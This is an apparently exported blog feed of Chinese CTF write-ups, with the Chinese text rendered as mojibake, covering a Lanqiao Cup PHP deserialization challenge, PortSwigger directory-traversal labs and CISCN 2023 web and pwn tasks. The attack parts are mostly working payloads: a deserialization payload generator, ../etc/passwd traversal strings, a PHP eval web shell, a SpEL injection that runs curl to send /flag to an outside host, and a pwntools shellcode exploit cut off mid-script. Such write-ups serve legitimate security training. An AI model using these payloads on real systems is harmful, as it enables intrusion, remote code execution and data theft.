<p>åœ¨åˆšå­¦ä¹ phpå¼€å‘çš„é˜¶æ®µï¼Œç¨‹åºå‘˜ä»¬å¸¸å¸¸ä¼šå¿½ç•¥å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„æ­£ç¡®éªŒè¯å’Œè¿‡æ»¤ï¼Œè¿™å¾€å¾€ä¼šç»™ç¨‹åºå¸¦æ¥ä¸¥é‡çš„å®‰å…¨éšæ‚£ã€‚å› ä¸ºæœªç»éªŒè¯å’Œè¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥æ•°æ®å¯èƒ½åŒ…å«æ¶æ„ä»£ç æˆ–è€…éæ³•å­—ç¬¦ï¼Œè¿™äº›æ•°æ®ä¸€æ—¦è¢«ç¨‹åºæ‰€æ¥å—å¹¶å¤„ç†ï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºå‡ºç°å„ç§æ¼æ´ã€‚ï¼ˆpsï¼šå“ˆå“ˆå“ˆå“ˆå¾ˆè“æ¡¥ï¼‰</p>
<h2 id="è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹"></a> è§£é¢˜è¿‡ç¨‹</h2>
<h3 id="0x01-æ„é€ ååºåˆ—åŒ–popé“¾"><a class="markdownIt-Anchor" href="#0x01-æ„é€ ååºåˆ—åŒ–popé“¾"></a> 0x01ã€æ„é€ ååºåˆ—åŒ–POPé“¾</h3>
<p>ä¸‹å‘å®¹å™¨ï¼Œçœ‹äº†ä¸€ä¸‹ç½‘é¡µæºç ï¼Œçœ‹åˆ°åº•éƒ¨å­˜åœ¨æç¤º<code>header ?</code>ï¼ŒbpæŠ“åŒ…çœ‹äº†ä¸€ä¸‹</p>
<p><img src="/2023/06/%E8%93%9D%E6%A1%A5%E6%9D%AFCTF-ezphp-Wirteup/image-20230603182704348.png" alt="image-20230603182704348"></p>
<p>ç»™äº†é¢˜ç›®æ‰€åœ¨çš„ç›®å½•<code>admin3ecr3t.php</code>ï¼Œè®¿é—®å¾—åˆ°äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key === <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\0&quot;</span>,<span class="string">&quot;00&quot;</span>,<span class="variable">$ser</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ä¸€çœ¼å°±èƒ½çœ‹åˆ°æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿åœ¨<code>classA</code>ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key === <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ»¡è¶³æ¡ä»¶<code>key===&quot;\0key\0&quot;</code>å³å¯è¯»å–flagæ–‡ä»¶ä¸­çš„å†…å®¹</p>
<p>å¾€ä¸‹çœ‹åœ¨<code>class B</code>å’Œ<code>class C</code>ä¸­å­˜åœ¨ä¸‰ä¸ªé­”æœ¯æ–¹æ³•åˆ†åˆ«æ˜¯:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span><br></pre></td></tr></table></figure>
<p>ä¸€å¼€å§‹å°±åªæƒ³ç€æ„é€ ååºåˆ—åŒ–POPé“¾ï¼Œä»”ç»†çœ‹äº†ä¸€ä¸‹è¿™ä¸ªé¢˜è²Œä¼¼å’Œååºåˆ—åŒ–æ²¡å•¥å…³ç³»ï¼Œåªç”¨è§¦å‘__tostring()å°±è¡Œï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯ï¼š</p>
<ol>
<li>åˆ›å»ºä¸€ä¸ª <code>$key</code> å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„ç±»æ˜¯ <code>A</code>ï¼Œå¹¶å°† <code>$key</code> å¯¹è±¡çš„ <code>key</code> å±æ€§è®¾ç½®ä¸º <code>\0key\0</code>ã€‚</li>
<li>åˆ›å»ºä¸€ä¸ªåä¸º <code>$f</code> çš„æ•°ç»„ï¼Œè¯¥æ•°ç»„åŒ…å«ä¸¤ä¸ªå…ƒç´ ã€‚ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯å¯¹ <code>$key</code> å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–åå¾—åˆ°çš„æ–°å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯å­—ç¬¦ä¸² <code>'readflag'</code>ã€‚</li>
<li>åˆ›å»ºä¸€ä¸ª <code>$reflection</code> å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„ç±»æ˜¯ <code>B</code>ï¼Œå¹¶å°† <code>$reflection</code> å¯¹è±¡çš„ <code>b</code> å±æ€§è®¾ç½®ä¸º <code>$f</code>ã€‚</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="string">&quot;\0key\0&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$key</span>-&gt;key = <span class="string">&quot;\0key\0&quot;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$key</span>)), <span class="string">&#x27;readflag&#x27;</span>);</span><br><span class="line"><span class="variable">$reflection</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$reflection</span>-&gt;b=<span class="variable">$f</span>;</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥åªéœ€è¦å¯¹<code>$reflection</code>åºåˆ—åŒ–å°±å¯ä»¥è§¦å‘<code>__tostring</code>ï¼Œä½†é¢˜ç›®åˆ°è¿™å„¿æ‰ç®—åˆšåˆšå¼€å§‹ï¼Œæ¥ä¸‹æ¥æ˜¯å¦‚ä½•bypass<code>strstr_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser)</code></p>
<h3 id="0x02-bypassstrstr_ireplace000ser"><a class="markdownIt-Anchor" href="#0x02-bypassstrstr_ireplace000ser"></a> 0x02ã€bypass<code>strstr_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser)</code></h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="string">&quot;\0key\0&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$key</span>-&gt;key = <span class="string">&quot;\\\0key\\\0&quot;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$key</span>)), <span class="string">&#x27;readflag&#x27;</span>);</span><br><span class="line"><span class="variable">$reflection</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$reflection</span>-&gt;b=<span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$payload_str</span> = <span class="string">&#x27;&quot;;s:3:&quot;str&quot;;&#x27;</span> . <span class="title function_ invoke__">serialize</span>(<span class="variable">$reflection</span>) . <span class="string">&#x27;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$payload_str</span>);</span><br><span class="line"><span class="comment">//echo &quot;Length: &quot; . $obj_len;</span></span><br><span class="line"><span class="variable">$add_str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$obj_len</span>;<span class="variable">$i</span>++) <span class="variable">$add_str</span> = <span class="variable">$add_str</span> . <span class="string">&quot;\0&quot;</span>;</span><br><span class="line"><span class="comment">//echo &quot;&lt;br&gt;\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;1&quot;</span> . <span class="variable">$add_str</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&quot;;s:7:&#x27;</span>, <span class="string">&#x27;key&quot;;S:5:&#x27;</span>, <span class="variable">$payload_str</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;%3Bs%3A3%3A&quot;str&quot;%3BO%3A1%3A&quot;B&quot;%3A1%3A%7Bs%3A1%3A&quot;b&quot;%3Ba%3A2%3A%7Bi%3A0%3BO%3A1%3A&quot;A&quot;%3A1%3A%7Bs%3A3%3A&quot;key&quot;%3BS%3A5%3A&quot;%5C%00key%5C%00&quot;%3B%7Di%3A1%3Bs%3A8%3A&quot;readflag&quot;%3B%7D%7D%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/06/%E8%93%9D%E6%A1%A5%E6%9D%AFCTF-ezphp-Wirteup/image-20230604015354743.png" alt="image-20230604015354743"></p>
]]></content>
      <categories>
        <category>èµ›äº‹Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>PortSwiggeré¶åœºç»ƒä¹ (ä¸€):ç›®å½•éå†(Directory traversal)</title>
    <url>/2023/06/PortSwigger%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%80-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-Directory-traversal/</url>
    <content><![CDATA[<p>PortSwiggeré¶åœºç»ƒä¹ (ä¸€):ç›®å½•éå†(Directory traversal)</p>
<span id="more"></span>
<h1 id="ç›®å½•éå†directory-traversal"><a class="markdownIt-Anchor" href="#ç›®å½•éå†directory-traversal"></a> ç›®å½•éå†(Directory traversal)</h1>
<h2 id="ç¬¬ä¸€å…³file-path-traversal-simple-case"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€å…³file-path-traversal-simple-case"></a> ç¬¬ä¸€å…³ï¼šFile path traversal, simple case</h2>
<p>ç›´æ¥æŠ“å–è·å–å›¾ç‰‡çš„åŒ…ï¼Œæ„é€ <code>filename=../../../../etc/passwd/</code></p>
<p><img src="/2023/06/PortSwigger%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%80-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-Directory-traversal/image-20230602232404266.png" alt="image-20230602232404266"></p>
<p>ç®€å•è¯´ä¸€ä¸‹ï¼šé¦–å…ˆå¯ä»¥çŒœæµ‹å›¾ç‰‡çš„å­˜å‚¨è·¯å¾„ä¸ºï¼š<code>/var/www/images/x.jpg</code>ï¼Œä½¿ç”¨<code>../../../../ect/passwd</code>èƒ½å¤Ÿç›´æ¥ç›®å½•ç©¿è¶Šåˆ°<code>/etc/passwd</code>ï¼Œå¹¶è¯»å–ç›¸å…³å†…å®¹ã€‚</p>
<h2 id="ç¬¬äºŒå…³file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"><a class="markdownIt-Anchor" href="#ç¬¬äºŒå…³file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"></a> ç¬¬äºŒå…³ï¼šFile path traversal, traversal sequences blocked with absolute path bypass</h2>
<p>é¦–å…ˆè¯•äº†ä¸€ä¸‹<code>../../../etc/passwd</code>ï¼Œå›æ˜¾æç¤º<code>&quot;No such file&quot;</code>ï¼Œè€ƒè™‘åˆ°é¶åœºæè¿°<code>absolute path</code>ï¼Œ</p>
<p>ç›´æ¥æ„é€ <code>filename=/etc/passwd/</code></p>
<p><img src="/2023/06/PortSwigger%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%80-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-Directory-traversal/image-20230602235352211.png" alt="image-20230602235352211"></p>
]]></content>
      <categories>
        <category>æŠ€æœ¯å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Directory-traversal</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCNåˆèµ›-Writeup</title>
    <url>/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/</url>
    <content><![CDATA[<p>é‚£å•¥ï¼Œä¸å¥½ç©ï¼Œæ²¡ç—…åˆ«æ¥ç©ï¼Œemmmmmï¼Œæˆ‘å»ºè®®*ç²¹å‡ºé¢˜äººè¿˜æ˜¯äº–ä¸€ä¸‹æ¯”è¾ƒå¥½ï¼Œæ•´ä½“ä½“éªŒï¼Œä¸å¥½ï¼Œæ˜å¹´ä¸æ‰“äº†ï¼Œ</p>
<p>åˆ†åŒºèµ›emmmmmmï¼Œä¸æ˜¯å¾ˆæœŸå¾…éš”å£å¤§å­¦çš„çº¿ä¸‹ï¼ˆï¼‰ï¼Œæ€»ç»“å°±æ˜¯ï¼ŒCISCNä¸å¥½ç©ï¼</p>
<span id="more"></span>
<h1 id="birkenwaldultrawriteup"><a class="markdownIt-Anchor" href="#birkenwaldultrawriteup"></a> BirkenwaldUltraâ€“Writeup</h1>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="dumpit"><a class="markdownIt-Anchor" href="#dumpit"></a> dumpit</h3>
<p>åˆ©ç”¨logçš„å¯dumpç‰¹æ€§å¯ä»¥åœ¨logç›®å½•ä¸‹å†™å…¥æ–°çš„æ–‡ä»¶</p>
<p>é»‘ç›’æµ‹è¯•å‘ç°ç±»ä¼¼&quot;$â€œã€â€;â€œã€â€ &quot;ã€ç­‰å­—ç¬¦è¢«è¿‡æ»¤ï¼Œä½¿ç”¨è½¬ä¹‰å­—ç¬¦æ¥å¡«å……bypass</p>
<p><code>?db=ctf&amp;table_2_dump=\%3C\?\phpinfo\(\)?\%3E%202%3E%20log/twe.php</code></p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/000005.png" alt="000005"></p>
<p>ç›´æ¥æœflag</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNZVIIVmEetPwbPtfivV4A4S.png" alt="img"></p>
<h3 id="uzip"><a class="markdownIt-Anchor" href="#uzip"></a> uzip</h3>
<p>ä¸¤æ¬¡å‹ç¼©ï¼Œä¸€æ¬¡åšè½¯è¿æ¥ï¼Œä¸€æ¬¡getshell</p>
<p>ç¬¬ä¸€æ¬¡ä¸Šä¼ æ„é€ è½¯è¿æ¥ï¼Œåˆ¶ä½œä¸€ä¸ªæ— æ ¼å¼æ–‡ä»¶æ‰“åŒ…ä¸Šä¼ ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">var/www/html</span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ å®Œæˆä¹‹åï¼Œåˆ¶ä½œshellçš„phpæœ¨é©¬</p>
<p><code>&lt;?php eval($_POST[0]);?&gt;</code></p>
<p>ä¸Šä¼ ä¹‹åï¼Œç›´æ¥èšå‰‘é“¾æ¥<img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/00002.png" alt="00002"></p>
<p>æ ¹ç›®å½•è¯»ï¼Œflag</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNakw8XFy6JO8KmoOmG0oW_B.png" alt="img"></p>
<h3 id="backendservice"><a class="markdownIt-Anchor" href="#backendservice"></a> BackendService</h3>
<p>å…ˆæ³¨å†Œç”¨æˆ·</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNbE7L_4bntBZYNzNeq31in-.png" alt="img"></p>
<p>ææƒè·å¾—nacosæƒé™ï¼šå°†falseæ”¹ä¸ºtrueå³å¯</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNaa8nvH2hRFnZCFvXw6Gj4d.png" alt="img"></p>
<p>é«˜æƒé™ç™»å½•æˆåŠŸåï¼š<img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/00001.png" alt="00001"></p>
<p>æ·»åŠ é…ç½®ï¼š<img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNa4fwi-4IRHXJwsH_ydLAQk.png" alt="img"></p>
<p>æ·»åŠ é…ç½®å†…å®¹ï¼š<img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/0011.png" alt="0011"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lb://backendservice&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="string">&quot;Path=/echo/&quot;</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;curl&#x27;,&#x27;-F&#x27;,&#x27;file=@/flag&#x27;,&#x27;http://ip:port/&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>vpsç›‘å¬è·å–flagï¼š</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNZWQ7KtCnpNjZp4FNkonJso.png" alt="img"></p>
<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
<h3 id="çƒ§çƒ¤æ‘Šå„¿"><a class="markdownIt-Anchor" href="#çƒ§çƒ¤æ‘Šå„¿"></a> çƒ§çƒ¤æ‘Šå„¿</h3>
<p>æŸ¥æ‰¾åˆ°ç¨‹åºä¸ºé™æ€é“¾æ¥åçœ‹åˆ°ç¨‹åºå†…æœ‰mprotectå¼€æƒé™å‡½æ•°ï¼Œå†™shellcodeå¹¶æ‰§è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./shaokao&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;123.56.238.150&#x27;</span>, <span class="number">16917</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line">mprotect=<span class="number">0x458B00</span></span><br><span class="line">pop_rsi=<span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x4a404b</span></span><br><span class="line">pop_rdi=<span class="number">0x40264f</span></span><br><span class="line">bss_addr = <span class="number">0x4e9000</span></span><br><span class="line">read=<span class="number">0x457DC0</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">9876543210</span>))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span 